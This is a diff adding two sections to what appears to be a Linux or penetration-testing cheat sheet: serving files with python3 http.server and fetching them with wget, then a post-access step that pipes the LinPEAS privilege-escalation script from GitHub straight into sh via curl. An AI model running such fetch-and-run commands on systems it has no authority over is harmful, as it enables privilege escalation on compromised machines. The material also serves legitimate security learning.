@@ -911,3 +911,27 @@ logout
 #Renames all files with the .jpg extension by adding a prefix.
 for file in *.jpg; do mv "$file" "newprefix_$file"; done
 ```
+
+# File Transfer between two machines using python server
+
+```bash
+#Start the HTTP server on the machine with the file you want to share:
+#Open a terminal or command prompt, navigate to the directory containing the file, and run:
+python3 -m http.server 80
+
+wget http://<SERVER_IP>/<file_name>
+
+#Or
+#Access the server from another machine:
+#Open a web browser on the second machine and enter the IP address or hostname of the first machine, followed by the port number.
+http://<SERVER_IP>:80
+```
+
+# What sfter getting access to a machine?
+```bash
+#Screen the machine automatically by LinPEAS - Linux Privilege Escalation Awesome Script
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+```
+
+
+
